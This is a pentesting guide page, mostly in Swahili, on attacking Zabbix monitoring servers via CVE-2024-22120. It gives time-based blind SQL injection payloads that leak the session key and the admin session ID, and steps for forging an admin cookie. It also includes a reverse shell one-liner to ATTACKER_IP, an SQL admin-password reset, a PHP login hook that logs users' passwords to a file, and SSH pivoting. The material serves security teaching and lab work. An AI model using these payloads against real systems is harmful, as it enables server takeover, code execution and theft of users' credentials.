# Zabbix Usalama

{{#include ../../banners/hacktricks-training.md}}

## Muhtasari

Zabbix ni jukwaa la monitoring linaloonyesha UI ya wavuti (kwa kawaida nyuma ya Apache/Nginx) na sehemu ya server ambayo pia inazungumza Zabbix protocol kwenye TCP/10051 (server/trapper) na agent kwenye TCP/10050. Wakati wa pentesting unaweza kukutana na:

- UI ya Wavuti: HTTP(S) virtual host kama zabbix.example.tld
- Zabbix server port: 10051/tcp (JSON over a ZBXD header framing)
- Zabbix agent port: 10050/tcp

Useful cookie format: zbx_session is Base64 of a compact JSON object that includes at least sessionid, serverCheckResult, serverCheckTime and sign. The sign is an HMAC of the JSON payload.

## zbx_session cookie internals

Toleo za hivi karibuni za Zabbix huchakata cookie kama ifuatavyo:

- data JSON: {"sessionid":"<32-hex>","serverCheckResult":true,"serverCheckTime":<unix_ts>}
- sign: HMAC-SHA256(key=session_key, data=JSON string of data sorted by keys and compact separators)
- Final cookie: Base64(JSON_with_sign)

Kama unaweza kupata session_key ya kimataifa na sessionid ya Admin halali, unaweza kutengeneza cookie ya Admin halali offline na kuingia kwenye UI.

## CVE-2024-22120 — Time-based blind SQLi in Zabbix Server audit log

Matoleo yaliyoathirika (kama ilivyo hatiwa hadharani):

- 6.0.0–6.0.27, 6.4.0–6.4.12, 7.0.0alpha1

Muhtasari wa udhaifu:

- Wakati utekelezaji wa Script unarekodiwa katika audit log ya Zabbix Server, sehemu ya clientip haisafishwi na inaunganishwa ndani ya SQL, ikiruhusu time-based blind SQLi kupitia server component.
- Hii inaweza kutumika kwa kutuma ombi la "command" lililotengenezwa kwa Zabbix server port 10051 ukitumia sessionid halali ya low-privileged, hostid ambayo mtumiaji anaweza kufikia, na scriptid inayoruhusiwa.

Masharti ya awali na vidokezo vya kugundua:

- sessionid: Kutoka kwa guest/login katika web UI, decode zbx_session (Base64) ili kupata sessionid.
- hostid: Angalia kupitia maombi ya web UI (mfano, Monitoring → Hosts) au zuia kwa proxy; default mara nyingi ni 10084.
- scriptid: Ni scripts tu zinazoruhusiwa kwa nafasi ya sasa zitakazoendeshwa; thibitisha kwa kuchunguza menu ya script/majibu ya AJAX. Defaults kama 1 au 2 mara nyingi ziruhusiwa; 3 inaweza kukataliwa.

### Mtiririko wa matumizi ya udhaifu

1) Chochea kuingiza audit na SQLi kwenye clientip

- Unganisha kwa TCP/10051 na tuma ujumbe uliopangwa wa Zabbix na request="command" ukijumuisha sid, hostid, scriptid, na clientip uliowekwa kuwa usemu wa SQL ambao utaunganishwa na server na kutathminiwa.

Minimal message (JSON body) fields:
```json
{
"request": "command",
"sid": "<low-priv-sessionid>",
"scriptid": "1",
"clientip": "' + (SQL_PAYLOAD) + '",
"hostid": "10084"
}
```
Muundo kamili wa wire ni: "ZBXD\x01" + 8-byte little-endian length + UTF-8 JSON. Unaweza kutumia pwntools au msimbo wako wa socket kuiframu.

2) Time-bruteforce secrets via conditional sleep

Tumia conditional expressions ili leak hex-encoded secrets herufi 1 kwa wakati kwa kupima muda wa majibu. Mifano ambazo zimefanya kazi kwa vitendo:

- Leak global session_key kutoka config:
```sql
(select CASE WHEN (ascii(substr((select session_key from config),{pos},1))={ord}) THEN sleep({T_TRUE}) ELSE sleep({T_FALSE}) END)
```
- Leak Msimamizi session_id (userid=1) kutoka sessions:
```sql
(select CASE WHEN (ascii(substr((select sessionid from sessions where userid=1 limit 1),{pos},1))={ord}) THEN sleep({T_TRUE}) ELSE sleep({T_FALSE}) END)
```
Vidokezo:

- charset: 32 hex chars [0-9a-f]
- Chagua T_TRUE >> T_FALSE (mfano, 10 vs 1) na pima wall-clock kwa kila jaribio
- Hakikisha scriptid yako imeidhinishwa kwa mtumiaji; vinginevyo hakuna audit row itakayozalishwa na upimaji wa muda hautaenda kazi

3) Falsifia cookie ya Admin

Mara baada ya kuwa na:

- session_key: 32-hex from config.session_key
- admin_sessionid: 32-hex from sessions.sessionid for userid=1

Hesabu:

- sign = HMAC_SHA256(key=session_key, data=json.dumps({sessionid, serverCheckResult:true, serverCheckTime:now}, sort by key, compact))
- zbx_session = Base64(JSON_with_sign)

Weka cookie zbx_session kwa thamani hii na fanya GET /zabbix.php?action=dashboard.view ili kuthibitisha upatikanaji wa Admin.

### Vifaa tayari

- Public PoC inao‑tamatisha: bruteforce ya session_key na admin sessionid, na cookie forging; inahitaji pwntools na requests.
- Vigezo vinavyotolewa kawaida ni pamoja na: --ip (FQDN of UI), --port 10051, --sid (low-priv), --hostid, na kwa hiari --admin-sid inayojulikana ili kuruka bruteforce.

## RCE kupitia Script execution (post-Admin)

Ukiwa na upatikanaji wa Admin katika UI, unaweza kutekeleza Scripts zilizotanguliwa dhidi ya hosts zinazofuatiliwa. Ikiwa agents/hosts zinafanya amri za script kwa ndani, hii inasababisha code execution kwenye mifumo hiyo (mara nyingi kama zabbix user kwenye hosts za Linux):

- Ukaguzi wa haraka: endesha id ili kuthibitisha muktadha wa mtumiaji
- Mfano wa reverse shell:
```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'
```
Kuboresha TTY (Linux):
```bash
script /dev/null -c bash
# background with Ctrl+Z, then on attacker terminal:
stty raw -echo; fg
reset
```
Ikiwa una DB access, mbadala wa kutengeneza cookie ni kuweka upya nenosiri la Admin kwa bcrypt iliyoandikwa kwa "zabbix":
```sql
UPDATE users SET passwd='$2a$10$ZXIvHAEP2ZM.dLXTm6uPHOMVlARXX7cqjbhM6Fn0cANzkCQBWpMrS' WHERE username='Admin';
```
## Credential capture via login hook (post-exploitation)

Ikiwa file write inawezekana kwenye web UI server, unaweza kwa muda kuongeza logging snippet kwenye /usr/share/zabbix/index.php karibu na form-based login branch ili capture credentials:
```php
// login via form
if (hasRequest('enter') && CWebUser::login(getRequest('name', ZBX_GUEST_USER), getRequest('password', ''))) {
$user = $_POST['name'] ?? '??';
$password = $_POST['password'] ?? '??';
$f = fopen('/dev/shm/creds.txt','a+'); fputs($f, "$user:$password\n"); fclose($f);
CSessionHelper::set('sessionid', CWebUser::$data['sessionid']);
}
```
Watumiaji wanathibitisha kama kawaida; soma /dev/shm/creds.txt baadaye. Ondoa hook utakapomaliza.

## Pivoting kwa huduma za ndani

Hata ikiwa shell ya akaunti ya huduma ni /usr/sbin/nologin, kuongeza entry ya SSH authorized_keys na kutumia -N -L kunaruhusu local port-forwarding kwa loopback-only services (mfano, CI/CD kwenye 8111):
```bash
ssh -i key user@host -N -L 8111:127.0.0.1:8111
```
Ona mifano zaidi ya tunneling: Angalia [Tunneling and Port Forwarding](../../generic-hacking/tunneling-and-port-forwarding.md).

## Vidokezo vya Uendeshaji

- Thibitisha kwamba scriptid inaruhusiwa kwa jukumu la sasa (guest anaweza kuwa na seti iliyopunguzwa)
- Timing brute inaweza kuwa polepole; cache sessionid ya admin uliopatikana na uitumie tena
- JSON iliyotumwa kwa 10051 lazima ifungwe na header ya ZBXD\x01 na urefu wa little-endian

## References

- [HTB Watcher — Zabbix CVE-2024-22120 to Admin/RCE and TeamCity root pivot](https://0xdf.gitlab.io/2025/10/09/htb-watcher.html)
- [CVE-2024-22120-RCE toolkit (PoC scripts)](https://github.com/W01fh4cker/CVE-2024-22120-RCE)

{{#include ../../banners/hacktricks-training.md}}
